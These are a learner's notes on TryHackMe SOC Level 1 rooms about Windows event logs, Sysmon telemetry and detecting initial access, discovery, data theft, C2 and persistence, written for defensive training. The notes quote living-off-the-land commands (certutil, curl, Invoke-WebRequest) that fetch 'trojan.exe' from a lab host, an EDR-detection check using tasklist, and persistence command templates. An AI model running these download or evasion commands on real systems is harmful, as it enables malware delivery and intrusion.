# Section 09: Windows Logging & Threat Detection

**Platform:** TryHackMe  
**Path:** SOC Level 1  
**Status:** Completed  
**Rooms Completed:** 4/4  

---

# Overview

This section focused on native Windows event logging, Sysmon telemetry, and host-based threat detection strategies across the entire attack lifecycle. Through practical log triage using Event Viewer, PowerShell, and log parsers, I learned how to investigate initial access vectors (RDP brute-forcing, phishing, USB propagation), audit execution chains, trace post-exploitation discovery and collection (automated stealers, LotL downloads), and unmask persistence mechanisms (backdoor user creation, Windows services, scheduled tasks, registry run keys, and startup drops).

---

## Rooms Completed

- Windows Logging for SOC
- Windows Threat Detection 1
- Windows Threat Detection 2
- Windows Threat Detection 3

---

# Room 01: Windows Logging for SOC

## Objective

Understand native Windows log architecture (`.evtx`), Sysmon event collection, and PowerShell command auditing to triage authentication events, account modifications, and process executions.

## Key Learning Points

### Windows Log Architecture & Sysmon
Native Windows security logs are binary `.evtx` files stored in `C:\Windows\System32\winevt\Logs`, parsed via Event Viewer (`eventvwr.msc`) or CLI tools. Sysmon enhances native logging by tracking process trees, network connections, file creations, and DNS requests.

### Key Windows Security & Sysmon Event IDs

| Event Source | Event ID | Description / Purpose | Primary Red Flags / SOC Focus |
| :--- | :--- | :--- | :--- |
| **Security Log** | **4624** | Successful User Logon | Suspicious source IPs, non-corporate hostnames, Logon Type 10 (RDP) preceded by Type 3 (Network) |
| **Security Log** | **4625** | Failed User Logon | Password spraying across service accounts, high-frequency brute-force targeting `Administrator` |
| **Security Log** | **4720** | User Account Created | Unauthorized accounts created outside change windows or using non-standard naming schemes |
| **Security Log** | **4732** | Added to Local Privilege Group | Accounts added to `Administrators`, `Backup Operators`, or `Remote Desktop Users` |
| **Sysmon** | **1** | Process Creation | Executions from `C:\Temp` or `C:\Users\Public`, unexpected parent-child processes, unverified hashes |
| **Sysmon** | **3** | Network Connection | Outbound connections on non-standard ports (e.g., 7777, 4444) or direct-to-IP traffic |
| **Sysmon** | **11** | File Creation | Executables dropped to staging directories or system startup paths |
| **Sysmon** | **22** | DNS Query | Domain requests resolving to low-reputation TLDs (`.click`, `.top`, high-entropy strings) |

### PowerShell Command Auditing
Because `powershell.exe` executes commands inside a single process session without spawning new child processes for built-in cmdlets, analysts inspect the per-user command history file:
`C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`

## Practical Exercise

In this lab, I analyzed pre-recorded log captures (`Practice-Security.evtx`, `Practice-Sysmon.evtx`) and user PowerShell history files:

- **Authentication Triage:** Filtered `Practice-Security.evtx` for Event ID 4625 to isolate an RDP brute-force attack from `10.10.53.248`. Correlated subsequent Event ID 4624 entries to confirm successful initial compromise against the `Administrator` account under Logon ID `0x183C36D`.
- **Backdoor Account Detection:** Tracked post-exploitation account creation using Event IDs 4720 and 4732. Identified backdoor account `svc_sysrestore` created under Logon ID `0x183C36D` and escalated to `Backup Operators` and `Remote Desktop Users`.
- **Process & Download Analysis:** Investigated `Practice-Sysmon.evtx` for Sysmon Event ID 1. Traced a web browser download where `sarah.miller` retrieved malicious payload `ckjg.exe` from `http://gettsveriff.com/bgj3/ckjg.exe`.
- **Persistence & C2 Identification:** Inspected Sysmon Event ID 11 and Event ID 3. Located a persistence shortcut dropped in the Startup directory (`DeleteApp.url`) and identified C2 traffic connecting to `193.46.217.4:7777` (resolving to `hkfasfsafg.click` via Sysmon Event ID 22).
- **PowerShell History Inspection:** Parsed `ConsoleHost_history.txt` to uncover past reconnaissance commands (`Get-ComputerInfo`) and extract stored console artifacts.

## Skills Acquired

- Filtered native Security `.evtx` logs for authentication failures and account modifications.
- Parsed Sysmon telemetry to trace process creation, file drops, and network traffic.
- Correlated Logon IDs across Event IDs 4625, 4624, 4720, and 4732.
- Inspected PowerShell `ConsoleHost_history.txt` files for CLI reconnaissance artifacts.

## Interview Question

**Q: How do you correlate a successful RDP compromise to subsequent attacker actions using Windows Event Logs?**

**A:** Identify high-volume failed logons (Security Event ID 4625) followed by a successful logon (Security Event ID 4624) with Logon Type 10 (Remote Interactive). Extract the unique `Logon ID` (e.g., `0x183C36D`) from the 4624 event, then filter Security Event ID 4688 or Sysmon Event ID 1 for process creation events sharing that exact same Logon ID to trace all commands executed during the compromised session.

## Key Takeaway

Correlating unique Logon IDs between Security Event 4624 and Sysmon Event 1 provides complete visibility into an adversary's post-exploitation activity following an initial breach.

---

# Room 02: Windows Threat Detection 1

## Objective

Detect Windows Initial Access techniques across public-facing services (RDP brute-force), user-driven phishing (malicious `.lnk` shortcuts, double extensions), and removable media exploitation using Security `.evtx` and Sysmon telemetry.

## Key Learning Points

### Initial Access Detection & Event Mapping

| Vector | MITRE Technique | Primary Log Source | Key Event IDs / Artifacts | SOC Detection Strategy |
| :--- | :--- | :--- | :--- | :--- |
| **RDP Brute-Force** | T1133 | Windows Security | 4625 (Failed Logon) | High volume of Remote Interactive/Network failures (Logon Type 10/3) targeting `Administrator` |
| **RDP Breach** | T1133 | Security + Sysmon | 4624 (Success) + Sysmon ID 1 | Filter for Logon Type 10; map Logon ID to Sysmon Event ID 1 to isolate attacker commands |
| **Phishing Download** | T1566 | Sysmon | Sysmon ID 11 (FileCreate) | Browser process (`msedge.exe`) dropping archives (`.zip`) to `\Downloads\`, followed by extraction |
| **Malicious LNK** | T1566.002 | Sysmon | Sysmon ID 1 (Process Create) | `explorer.exe` spawning `powershell.exe` via embedded `.lnk` target parameters |
| **USB Media** | T1091 | Sysmon | Sysmon ID 1 & ID 11 | Process launches originating from non-system drive letters (e.g., `E:\filename.exe`) |

### Forensic Indicators
- **Extension Masquerading:** Executables disguised with fake icons or double extensions (e.g., `best-cat.jpg.exe` or `.com` binaries).
- **USB Artifacts:** Executable creation or process launch events originating directly from removable volumes (`E:\`, `F:\`), followed by secondary payload drops to `C:\Users\Public\`.

## Practical Exercise

In this lab, I evaluated threat scenarios across RDP, Phishing, and USB log datasets:

- **RDP Brute-Force & Compromise Triage:** Filtered `RDP-Security.evtx` for Event ID 4625 to aggregate failed login targets. Identified successful RDP breach (Event ID 4624, Logon Type 10) originating from IP `203.205.34.107` under host `DESKTOP-QNBC4UU`.

```powershell
# Aggregate failed RDP login targets
Get-WinEvent -Path "RDP-Security.evtx" | Where-Object {$_.Id -eq 4625} | Select-Object @{Name='TargetUserName'; Expression={$_.Properties[5].Value}} | Group-Object TargetUserName | Sort-Object Count -Descending

```

* **Phishing Chain Investigation:** Examined `Phishing-Sysmon.evtx` to identify extension masquerading and extracted embedded PowerShell stagers pointing to `http://wp16.hqywlqpa.thm:8000/cgi-bin/f`. Tracked Sysmon Event ID 11 to follow archive downloads (`top-cats.zip`) and traced execution of double-extension payload `best-cat.jpg.exe` (PID 5484) connecting to domain `rjj.store` (Sysmon Event ID 22).
* **Removable Media Forensic Analysis:** Filtered `USB-Sysmon.evtx` for Sysmon Event ID 1 to catch volume execution (`E:\Open Sandisk 4GB USB.exe`). Tracked secondary payload drops to `C:\Users\Public\Documents\winupdate.exe` and monitored self-propagation across secondary volumes (`F:\`).

## Skills Acquired

* Queried Windows Event Logs using PowerShell `Get-WinEvent`.
* Traced phishing execution chains from browser downloads to payload extraction.
* Analyzed malicious `.lnk` shortcut parameters and hidden PowerShell stagers.
* Tracked removable media malware execution across non-standard drive letters.

## Interview Question

**Q: How do you detect execution originating from a malicious USB drive using Sysmon?**

**A:** Monitor Sysmon Event ID 1 (Process Creation) where the `Image` path starts with a non-system drive letter (e.g., `E:\`, `F:\`). Additionally, cross-reference Sysmon Event ID 11 (File Creation) for secondary payload drops originating from that process into writeable local staging paths like `C:\Users\Public\` or `%AppData%`.

## Key Takeaway

Initial access detection requires scrutinizing parent-child execution boundaries—such as browsers or file explorers spawning scripting interpreters—to catch payloads before execution.

---

# Room 03: Windows Threat Detection 2

## Objective

Detect post-compromise adversary behavior across Discovery, Collection, Credential Access, and Ingress Tool Transfer tactics using Sysmon process trees and network telemetry.

## Key Learning Points

### Post-Exploitation Tactics & Event Mapping

| Tactic | MITRE Technique | Tool / Utility Used | Log Source & Event ID | SOC Detection Strategy |
| --- | --- | --- | --- | --- |
| **Discovery** | T1087 / T1057 | `whoami`, `net.exe`, `tasklist` | Sysmon ID 1 / Sec ID 4688 | Rapid execution of native discovery binaries under suspicious parent processes (`invoice.pdf.exe`) |
| **Collection** | T1005 / T1115 | `stealer.exe`, `Get-Clipboard` | Sysmon ID 1 & ID 11 | Automated searches for target extensions (`.docx`, `.pdf`, `.xlsx`) and temporary staging directory creation |
| **Credential Access** | T1555 | Chrome Password Manager, SSH | File System / Registry | File access to `\AppData\Local\Google\Chrome\User Data\` or local SSH keys (`C:\Users\<USER>\.ssh\`) |
| **Ingress Tool Transfer** | T1105 | `certutil`, `curl`, `powershell` | Sysmon ID 1 & ID 22 | Network requests originating from non-browser command-line utilities |

### Living-off-the-Land (LotL) Transfers

Adversaries misuse native Windows utilities to fetch external payloads directly to disk:

```text
# Certutil File Retrieval
certutil.exe -urlcache -f [http://appsforfree.thm/trojan.exe](http://appsforfree.thm/trojan.exe) output.exe

# Native cURL Download
curl.exe [http://appsforfree.thm/trojan.exe](http://appsforfree.thm/trojan.exe) -o output.exe

# PowerShell Web Request
powershell.exe -c "Invoke-WebRequest -Uri '[http://appsforfree.thm/trojan.exe](http://appsforfree.thm/trojan.exe)' -OutFile 'output.exe'"

```

## Practical Exercise

In this lab, I executed discovery commands, audited automated stealer samples, and identified ingress tool transfers:

* **Process Tree & Evasion Analysis:** Filtered Sysmon Event ID 1 to trace execution originating from `invoice.pdf.exe`. Identified initial discovery commands (`whoami`) and located EDR evasion checks executed via `cmd.exe`:

```cmd
cmd /c "tasklist /v | findstr MsSense.exe || echo No MS Defender EDR"

```

Correlated Sysmon Event ID 22 (DNS Query) to locate the exfiltration endpoint (`exfil.beecz.cafe`).

* **Stealer Malware & Collection Auditing:** Analyzed host telemetry generated by `stealer.exe`. Identified the automated staging directory (`staging_58f1`), target file search patterns (`.docx`, `.pdf`, `.xlsx`), clipboard harvesting via PowerShell (`Get-Clipboard`), and the exfiltration destination (`collecteddata-storage-2025.s3.amazonaws.com`).
* **Ingress Tool Transfer Verification:** Executed multi-vector file transfers against `http://appsforfree.thm/trojan.exe` via browser, `curl.exe`, `certutil.exe`, and PowerShell `Invoke-WebRequest` to capture diagnostic indicators.

## Skills Acquired

* Reconstructed process execution trees using Sysmon `ProcessId` and `ParentProcessId`.
* Detected EDR discovery and evasion commands launched via `cmd.exe`.
* Audited stealer malware staging folders and clipboard harvesting behavior.
* Identified Living-off-the-Land (LotL) binary downloads using Sysmon Event IDs 1 and 22.

## Interview Question

**Q: Why is the use of `certutil.exe` for downloading files considered a high-fidelity indicator of compromise?**

**A:** `certutil.exe` is a administrative utility designed for managing administrative certificates. When executed with flags like `-urlcache -f` pointing to an external HTTP URL, it is being abused as a Living-off-the-Land (LotL) downloader to fetch external payloads while bypassing perimeter download controls.

## Key Takeaway

Monitoring command-line arguments of native administrative binaries (`certutil`, `curl`, `powershell`) allows defenders to spot payload downloads and discovery commands early in the breach lifecycle.

---

# Room 04: Windows Threat Detection 3

## Objective

Identify Command & Control (C2) channels, local persistence mechanisms (backdoor users, services, scheduled tasks, run keys, startup folder), and operational impact indicators.

## Key Learning Points

### Persistence Vectors & Event Mapping

| Persistence Vector | Command / Technique | Primary Log Source | Key Event IDs | SOC Detection Focus |
| --- | --- | --- | --- | --- |
| **Backdoor User** | `net user <user> /add` | Windows Security | 4720 (Create), 4732 (Group Add) | Unauthorized accounts added to `Administrators` or `Remote Desktop Users` |
| **Windows Service** | `sc create <name> binpath=` | Security & System | 4697 (Sec), 7045 (System) | Service creations executing binaries from non-standard paths (parent: `services.exe`) |
| **Scheduled Task** | `schtasks /create` | Windows Security | 4698 (Task Created) | Tasks scheduled on boot/logon running hidden scripts or binaries (parent: `svchost.exe`) |
| **Registry Run Key** | `reg add ...\CurrentVersion\Run` | Sysmon | Sysmon ID 13 (Registry Value Set) | Registry modifications pointing to binaries in `%AppData%` or `%Temp%` |
| **Startup Folder** | Drop file to `...\Startup\` | Sysmon | Sysmon ID 11 (File Creation) | New `.exe` or `.lnk` files created in Startup directories (parent: `explorer.exe`) |

## Practical Exercise

In this practical lab, I analyzed pre-captured Security and Sysmon logs to triage active C2 connections, backdoored accounts, and malware persistence:

* **Command & Control Investigation:** Identified initial archive extraction (`URGENT!.zip`) and located the dropped C2 binary executing out of roaming data (`C:\Users\Administrator\AppData\Roaming\update.exe`). Correlated Sysmon Event ID 22 to confirm the C2 endpoint domain (`route.m365officesync.workers.dev`).
* **Backdoors Account Triage:** Filtered Security Event ID 4625 to count 6 failed login attempts against `Administrator`. Extracted Security Event ID 4720 to discover backdoor account `support`, and verified Event ID 4732 showing escalation to `Administrators`.
* **Services & Scheduled Task Auditing:** Identified a malicious Windows service created to persist Nessie malware (`Data Protection Service`). Located a scheduled task created to persist Troy malware (`AmazonSync`).
* **Run Keys & Startup Folder Triage:** Reconstructed process logs to identify `C:\Windows\explorer.exe` as the parent image executing Odin malware. Located and executed the Kitten malware sample to analyze its startup persistence key.

## Skills Acquired

* Identified C2 endpoints by correlating Sysmon Event ID 1 process paths with Event ID 22 DNS queries.
* Audited privilege escalation by parsing Security Event IDs 4720 and 4732.
* Detected persistence established via Windows Services (Event 7045/4697) and Scheduled Tasks (Event 4698).
* Traced registry Run key modifications (Sysmon Event ID 13) and Startup folder file drops (Sysmon Event ID 11).

## Interview Question

**Q: Where do you look in Windows Event Logs to detect a newly created scheduled task used for persistence?**

**A:** Inspect Windows Security Event Log for Event ID 4698 (A scheduled task was created). Examine the task XML payload within the event details to inspect the `Command` and `Arguments` fields, looking for execution of PowerShell, script interpreters, or binaries located in temporary directories (`%Temp%`, `%AppData%`).

## Key Takeaway

Adversaries establish persistence across multiple system layers; monitoring user additions, service registrations, scheduled tasks, registry run keys, and startup folders ensures broad coverage against persistent access attempts.

---

# 📊 Section 09 Summary

## Topics Covered

* Windows Log Architecture (`.evtx`) & Event Viewer Triage
* Key Security Log Event IDs (4624, 4625, 4720, 4732, 4688, 4697, 4698)
* Sysmon Telemetry (Event IDs 1, 3, 11, 13, 22)
* PowerShell Command Auditing (`ConsoleHost_history.txt`)
* RDP Brute-Force & Compromise Correlation (Logon Type 10 / 3)
* Phishing Download Chains & Masqueraded Extensions (`.jpg.exe`, `.lnk`)
* Removable Media (USB) Malware Tracking
* Host Discovery & EDR Evasion Detection (`whoami`, `net`, `tasklist`)
* Stealer Malware Staging & Clipboard Harvesting (`Get-Clipboard`)
* Living-off-the-Land (LotL) Ingress Transfers (`certutil`, `curl`, `powershell`)
* Command & Control (C2) Telemetry Correlation
* Account-Based Persistence & Group Escalation
* Malware Persistence (Services, Scheduled Tasks, Registry Run Keys, Startup Folder)

---

## Key Terms Learned

* `.evtx`
* Sysmon
* `ConsoleHost_history.txt`
* Event ID 4624 / 4625
* Event ID 4720 / 4732
* Sysmon Event ID 1 (Process Creation)
* Sysmon Event ID 11 (File Creation)
* Sysmon Event ID 13 (Registry Value Set)
* Sysmon Event ID 22 (DNS Query)
* Logon Type 10 (Remote Interactive)
* Extension Masquerading
* Living-off-the-Land (LotL)
* `certutil.exe`
* Event ID 7045 / 4697 (Service Creation)
* Event ID 4698 (Scheduled Task Creation)

---

## Skills Acquired

* Filtered and queried native Windows Security `.evtx` logs using PowerShell.
* Correlated Logon IDs across authentication, account creation, and process execution events.
* Reconstructed process execution trees using Sysmon `ProcessId` and `ParentProcessId` fields.
* Audited user PowerShell history files for discovery commands and credential artifacts.
* Identified LotL binary downloads and command-line execution arguments.
* Uncovered multi-vector persistence mechanisms across services, scheduled tasks, registry run keys, and startup directories.

---

## Personal Reflection

This section provided practical, hands-on experience with native Windows event logs and Sysmon telemetry. Understanding how initial access vectors translate into specific event IDs—and how to follow an attacker's tracks through process creation, discovery commands, LotL tool transfers, and persistence mechanisms—strengthened my host investigation skills. Mastering these event correlations provides the core analytical foundation needed to investigate endpoint compromises, triage malware execution, and contain threats within a Security Operations Center.



